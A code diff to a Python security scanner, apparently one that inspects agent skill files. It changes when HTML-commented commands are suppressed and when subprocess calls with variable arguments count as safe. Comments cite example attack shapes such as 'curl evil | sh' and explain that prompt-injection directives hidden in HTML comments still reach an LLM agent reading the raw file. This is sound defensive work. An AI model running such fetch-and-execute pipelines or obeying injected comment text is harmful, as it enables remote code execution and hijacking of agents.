@@ -111,6 +111,78 @@ _DATA_LANGS: Final[frozenset[str]] = frozenset(
 _FENCE_RE: Final[re.Pattern[str]] = re.compile(r"^\s*(?P<fence>```+|~~~+)\s*(?P<lang>[A-Za-z0-9_+-]*)\s*$")
 
 
+def _html_comment_spans(source: str) -> list[tuple[int, int]]:
+    """#135 — Return absolute ``(start, end)`` character offsets of every
+    well-formed HTML comment ``<!-- ... -->`` in ``source`` (``end`` exclusive,
+    covering the closing ``-->``).
+
+    Handles single-line and MULTI-LINE comments and multiple comments. An
+    UNTERMINATED ``<!--`` (no matching ``-->``) yields NO span — it does NOT
+    swallow the rest of the file as a comment (mirrors ``_build_fence_map``'s
+    unterminated-fence safety: a lone ``<!--`` at the top must never silence
+    every execution-class finding below it).
+    """
+    spans: list[tuple[int, int]] = []
+    pos = 0
+    while True:
+        open_at = source.find("<!--", pos)
+        if open_at == -1:
+            break
+        close_at = source.find("-->", open_at + 4)
+        if close_at == -1:
+            break  # unterminated — not a comment region; stop (no span swallows EOF)
+        end = close_at + 3  # include the closing "-->"
+        spans.append((open_at, end))
+        pos = end
+    return spans
+
+
+def _match_inside_html_comment(source: str, line_idx: int, match: str) -> bool:
+    """#135 — True iff ``match`` (the matched needle on line ``line_idx``)
+    falls INSIDE a well-formed HTML comment ``<!-- ... -->``.
+
+    HTML comments are PROVABLY INERT: a markdown renderer never emits them and
+    nothing executes them, so a command shape (e.g. ``curl … | sh``) living
+    only inside one cannot run. The check is character-precise: the match's
+    absolute offset must land within a comment span, so a ``curl`` that sits on
+    the SAME line as a comment but OUTSIDE it (``<!-- note --> curl evil|sh``)
+    is NOT treated as commented and stays visible.
+
+    FN-safe boundary: this only certifies the inert HTML-COMMENT context — a
+    code FENCE (```bash) or a bare prose line carrying the same command is NOT
+    a comment and keeps firing. INTENT-class rules are NOT routed here (an
+    agent reading SKILL.md source still sees comment text), only the genuinely
+    un-executable EXECUTION-class shapes (see ``_certain_benign_literal``).
+    """
+    if not match:
+        return False
+    spans = _html_comment_spans(source)
+    if not spans:
+        return False
+    lines = source.split("\n")
+    if not (0 <= line_idx < len(lines)):
+        return False
+    # Absolute offset of the start of this line in ``source`` (lines were
+    # split on "\n", so each line contributes len(line)+1 chars).
+    line_start = sum(len(lines[k]) + 1 for k in range(line_idx))
+    col = lines[line_idx].find(match)
+    if col == -1:
+        # The match text isn't a literal substring of the line (the scanner may
+        # have normalised it) — fall back to whole-line containment: the line
+        # is "inside a comment" iff its first non-space char's offset is within
+        # a span AND its last char's offset is too.
+        raw = lines[line_idx]
+        stripped = raw.strip()
+        if not stripped:
+            return False
+        first = line_start + raw.find(stripped[0])
+        last = line_start + len(raw) - 1
+        return any(s <= first and last < e for s, e in spans)
+    abs_start = line_start + col
+    abs_end = abs_start + len(match)  # exclusive
+    return any(s <= abs_start and abs_end <= e for s, e in spans)
+
+
 def _build_fence_map(source: str) -> list[tuple[int, int, str] | None]:
     """Return per-line list. Each entry is either:
 
@@ -277,6 +349,18 @@ _EXECUTION_CLASS_RULES_MD: Final[frozenset[str]] = frozenset(
         "OBFUSCATION",
     }
 )
+
+# #135 — rules that are PROVABLY un-executable inside an inert HTML comment
+# ``<!-- ... -->``. A renderer never emits a comment and nothing runs it, so a
+# command/shell/install shape that lives ONLY inside one cannot execute. This
+# is the execution-class set PLUS ``SUPPLY_CHAIN`` (a ``curl … | sh`` install
+# pipeline in a comment can fetch/run nothing). INTENT-class rules
+# (PROMPT_INJECT / INDIRECT_PROMPT_INJECT / DATA_EXFIL / …) are DELIBERATELY
+# EXCLUDED — an LLM agent reading the raw SKILL.md source still sees comment
+# text, so an injection directive in a comment stays a possible delivery
+# vector and must remain visible (matches the #125-C2 decision: an
+# HTML-comment HOW-TO carrying INDIRECT_PROMPT_INJECT is NOT suppressed).
+_HTML_COMMENT_INERT_RULES: Final[frozenset[str]] = _EXECUTION_CLASS_RULES_MD | frozenset({"SUPPLY_CHAIN"})
 
 # r10-final-blanket (2026-05-28) — rules whose matches inside markdown
 # backtick inline-code are documentation prose, not invocation.
@@ -1660,6 +1744,21 @@ _SUBPROCESS_DYNAMIC_RE: Final[re.Pattern[str]] = re.compile(
 _SUBPROCESS_LIST_LITERAL_RE: Final[re.Pattern[str]] = re.compile(r"\[\s*(?P<argv>[^\]]*)\]")
 # A single quoted-string list element, e.g. ``"uv"`` or ``'run'``.
 _QUOTED_STR_ELEM_RE: Final[re.Pattern[str]] = re.compile(r"""^(?:"[^"]*"|'[^']*')$""")
+# #133 — a simple bare-identifier or dotted-attribute argv ELEMENT, e.g.
+# ``test_database`` / ``self.db_name`` / ``os.devnull``. This is the safe
+# shape for an ARGUMENT (argv[1:]) of a NON-``shell=True`` subprocess call:
+# with no shell, a variable passed as ONE argv element is delivered verbatim
+# as a single argument to the named program — it CANNOT inject a shell
+# command (the OS exec's the program directly, no shell parses the string).
+# Strictly NO ``[`` / ``(`` (a nested call or subscript) and NO operator —
+# those are excluded both here (the anchored class) AND upstream by
+# ``_SUBPROCESS_DYNAMIC_RE`` (``+`` / ``.format`` / ``%`` / ``$`` / f-string).
+# argv[0] (the PROGRAM) is deliberately NOT allowed to be a bare name — a
+# dynamic program (``subprocess.run([cmd])``) IS attacker-controlled exec and
+# must stay visible; only argv[1:] may be a bare/dotted name.
+_BARE_OR_DOTTED_NAME_ELEM_RE: Final[re.Pattern[str]] = re.compile(
+    r"^[A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)*$"
+)
 # Shell interpreters: an argv whose FIRST element is one of these is a shell
 # invocation (``subprocess.run(["sh", "-c", "<arbitrary>"])`` is semantically
 # ``shell=True`` — the second element is an arbitrary command string). Even a
@@ -1707,18 +1806,29 @@ _INLINE_CODE_FLAG: Final[frozenset[str]] = frozenset(
 
 
 def _is_safe_literal_argv_subprocess(line: str) -> bool:
-    """#81 — True iff ``line`` invokes ``subprocess.run``/``Popen``/
-    ``check_output``/``check_call``/``call`` with a LIST-LITERAL first arg
-    whose elements are ALL string literals (no ``$VAR``/f-string/``+``/
-    ``.format``/``%``) AND the call has no ``shell=True`` AND the argv's first
-    element is NOT a shell interpreter.
+    """#81 + #133 — True iff ``line`` invokes ``subprocess.run``/``Popen``/
+    ``check_output``/``check_call``/``call`` with a LIST first arg in the
+    provably-safe NON-``shell=True`` shape:
 
-    This is the provably-safe subprocess shape. ``subprocess.run(cmd,
-    shell=True)`` / ``subprocess.run(f"curl {x}|sh", shell=True)`` /
-    ``subprocess.run([cmd_from_user])`` (a bare identifier element) /
-    ``subprocess.run(["sh", "-c", "<cmd>"])`` (argv0 is a shell interpreter —
-    semantically ``shell=True``) all carry a dynamic/shell marker → NOT
-    certified.
+    * argv[0] (the PROGRAM) is a QUOTED string literal that is NOT a shell
+      interpreter and NOT a code interpreter invoked with an inline-eval flag;
+    * argv[1:] (the ARGUMENTS) are each EITHER a quoted string literal OR a
+      simple bare-identifier / dotted-attribute name (``test_database`` /
+      ``self.db_name``);
+    * the call carries no ``shell=True`` / f-string / ``$VAR`` / ``+`` /
+      ``.format`` / ``%`` marker anywhere on the line.
+
+    Why argv[1:] may be a variable (#133): with no ``shell=True`` the OS
+    exec's the NAMED program directly and hands each argv element to it as ONE
+    verbatim argument — a variable ARGUMENT is delivered as a single string,
+    so it CANNOT inject a shell command (no shell parses it). The reported FP
+    ``subprocess.run(['dropdb', '--if-exists', test_database])`` is therefore
+    inert. By contrast a variable PROGRAM
+    (``subprocess.run([cmd])`` — argv0 a bare name) IS attacker-controlled exec
+    and stays visible; ``subprocess.run("…", shell=True)`` /
+    ``subprocess.run(["sh", "-c", x])`` (shell-interpreter argv0) /
+    ``subprocess.run(["python", "-c", code])`` (code-interp + eval flag) /
+    a nested-call / subscript / operator-bearing element all stay visible.
     """
     if not _SUBPROCESS_HEAD_RE.search(line):
         return False
@@ -1730,34 +1840,51 @@ def _is_safe_literal_argv_subprocess(line: str) -> bool:
     argv = m.group("argv").strip()
     if not argv:
         return False  # empty list is not a meaningful exec; don't certify
-    # Every comma-separated element must be a plain quoted string literal.
-    elements: list[str] = []
-    for elem in argv.split(","):
-        elem = elem.strip()
+    # Classify each comma-separated element as a uniform ``(kind, basename,
+    # raw)`` triple. A QUOTED literal is ``("lit", basename, raw)`` (basename =
+    # program-name match, raw = eval-flag match); a bare/dotted NAME is a safe
+    # ARGUMENT variable, ``("name", "", "")`` (never an interpreter, never a
+    # flag — the empty basename/raw can match neither set). Any other shape
+    # (nested call ``f(x)``, subscript ``a[0]``, an operator-bearing token) is
+    # non-literal exec material → not certified.
+    parsed: list[tuple[str, str, str]] = []
+    for raw_elem in argv.split(","):
+        elem = raw_elem.strip()
         if not elem:
-            continue  # trailing comma
-        if not _QUOTED_STR_ELEM_RE.match(elem):
-            return False  # a bare identifier / nested call / non-literal element
-        elements.append(elem)
-    if not elements:
+            continue  # trailing comma / spacing
+        if _QUOTED_STR_ELEM_RE.match(elem):
+            inner = elem[1:-1].strip()
+            parsed.append(("lit", inner.rsplit("/", 1)[-1].lower(), inner))
+        elif _BARE_OR_DOTTED_NAME_ELEM_RE.match(elem):
+            parsed.append(("name", "", ""))
+        else:
+            return False  # nested call / subscript / operator → not provably safe
+    if not parsed:
         return False
-    # Reject if the argv invokes an interpreter on an arbitrary code STRING —
-    # equivalent to shell=True/eval even with a fully-static argv:
-    #   * a SHELL interpreter ANYWHERE in the argv (``["sh","-c",…]`` and the
-    #     wrapped ``["env","bash","-c",…]`` / ``["xargs","sh","-c",…]``) — a
-    #     shell runs an arbitrary command string;
+    # argv0 (the PROGRAM) must be a STATIC quoted literal — a dynamic program
+    # (a bare name in argv0, e.g. ``subprocess.run([cmd])``) is exec of an
+    # attacker-chosen binary and must stay visible.
+    if parsed[0][0] != "lit":
+        return False
+    # Reject if a quoted-literal argv invokes an interpreter on an arbitrary
+    # code STRING — equivalent to shell=True/eval even with a static program:
+    #   * a SHELL interpreter ANYWHERE (``["sh","-c",…]`` / wrapped
+    #     ``["env","bash","-c",…]`` / ``["xargs","sh","-c",…]``) — a shell runs
+    #     an arbitrary command string;
     #   * a CODE interpreter (python/node/perl/ruby/php/…) FOLLOWED by an
-    #     inline-eval flag (``-c``/``-e``/``-E``/``--eval``/``-r``/…) — e.g.
-    #     ``python -c "<code>"`` / ``node -e "<code>"`` run arbitrary inline
-    #     code. A code interpreter with NO eval flag (``["uv","run","python",
-    #     "x.py"]`` / ``["python","x.py"]``) runs a NAMED, separately-scanned
-    #     target and stays certified.
-    basenames = [e[1:-1].strip().rsplit("/", 1)[-1].lower() for e in elements]
-    raw = [e[1:-1].strip() for e in elements]
-    for i, base in enumerate(basenames):
+    #     inline-eval flag (``-c``/``-e``/``-E``/``--eval``/``-r``/…). A code
+    #     interpreter with NO eval flag (``["python","x.py"]`` / a NAMED target,
+    #     even a bare-name target ``["python", script_path]``) stays certified
+    #     — a bare NAME can never be an eval flag.
+    for i, el in enumerate(parsed):
+        if el[0] != "lit":
+            continue
+        base = el[1]
         if base in _SHELL_INTERPRETER_ARGV0:
             return False
-        if base in _CODE_INTERPRETER_ARGV0 and any(f in _INLINE_CODE_FLAG for f in raw[i + 1 :]):
+        if base in _CODE_INTERPRETER_ARGV0 and any(
+            later[0] == "lit" and later[2] in _INLINE_CODE_FLAG for later in parsed[i + 1 :]
+        ):
             return False
     return True
 
@@ -2434,6 +2561,18 @@ def _certain_benign_literal(
     Each branch is self-guarded so the same surface carrying a real
     threat is NOT suppressed. See the module section header above.
     """
+    # (#135) EXECUTION-class / SUPPLY_CHAIN match inside an inert HTML comment
+    #        `<!-- … -->` (single- OR multi-line). A markdown renderer never
+    #        emits a comment and nothing executes it, so a command/shell/install
+    #        shape that lives ONLY inside one is provably un-runnable → suppress.
+    #        The SAME `curl evil | sh` in a real ```bash fence or a bare prose
+    #        line is NOT a comment and keeps firing (a fence is copy-paste-
+    #        runnable). INTENT-class rules are NOT routed here (an agent reading
+    #        the raw SKILL.md still sees comment text), so a prompt-injection /
+    #        exfil directive in a comment stays visible.
+    if rule_id in _HTML_COMMENT_INERT_RULES and _match_inside_html_comment("\n".join(lines), line_idx, match):
+        return True
+
     # (#77) TIME_BOMB on out-of-fence English prose with NO code construct
     #       (no Date/setTimeout/cron/sleep/at/timestamp-comparison/`()`). An
     #       English sentence that merely mentions a duration is inert; a
